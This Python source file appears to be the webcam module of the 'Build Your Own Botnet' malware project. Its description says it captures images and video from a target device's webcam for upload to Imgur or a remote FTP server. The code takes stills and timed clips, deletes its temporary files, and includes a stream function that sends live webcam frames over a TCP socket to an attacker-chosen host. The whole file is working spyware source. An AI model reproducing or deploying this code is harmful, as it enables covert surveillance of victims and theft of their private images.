#!/usr/bin/python
# -*- coding: utf-8 -*-
'Webcam (Build Your Own Botnet)'

# standard libarary
import os
import time
import base64
import pickle
import random
import socket
import struct

# packages
import cv2

# utilities
import util

# globals
command = True
results = {}
packages  = ['cv2']
platforms = ['win32','linux2','darwin']
usage = 'webcam <imgur/ftp>'
description = """
Capture image/video from target device's webcam and
optionally upload it to Imgur or a remote FTP server
"""

# main
def image(*args, **kwargs):
    try:
        dev = cv2.VideoCapture(0)
        time.sleep(0.5)
        r,f = dev.read()
        dev.release()
        if not r:
            util.log(f)
            return "Unable to access webcam"
        img = util.png(f)
        return base64.b64encode(img)
    except Exception as e:
        return '{} error: {}'.format(image.__name__, str(e))


def video(*args, **kwargs):
    try:
        fpath = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name == 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
        fourcc = cv2.VideoWriter_fourcc(*'DIVX') if os.name == 'nt' else cv2.VideoWriter_fourcc(*'XVID')
        output = cv2.VideoWriter(fpath, fourcc, 20.0, (640,480))
        length = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
        end = time.time() + length
        dev = cv2.VideoCapture(0)
        while True:
            ret, frame = dev.read()
            output.write(frame)
            if time.time() > end: break
        dev.release()
        with open(fpath, 'rb') as fp:
            result = base64.b64encode(fp.read())
        try:
            util.delete(fpath)
        except: pass
        return result
    except Exception as e:
        return '{} error: {}'.format(video.__name__, str(e))


def stream(host=None, port=None, retries=5):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while retries > 0:
            try:
                sock.connect((host, port))
                break
            except socket.error:
                retries -= 1
        if not retries:
            return 'Error: webcam stream unable to connect to server'
        dev = cv2.VideoCapture(0)
        try:
            t1 = time.time()
            while True:
                try:
                    ret, frame = dev.read()
                    data = pickle.dumps(frame)
                    sock.sendall(struct.pack("L", len(data))+data)
                    time.sleep(0.1)
                except Exception as e:
                    util.log('Stream error: {}'.format(str(e)))
                    break
        finally:
            dev.release()
            sock.close()
    except Exception as e:
        return '{} error: {}'.format(stream.__name__, str(e))
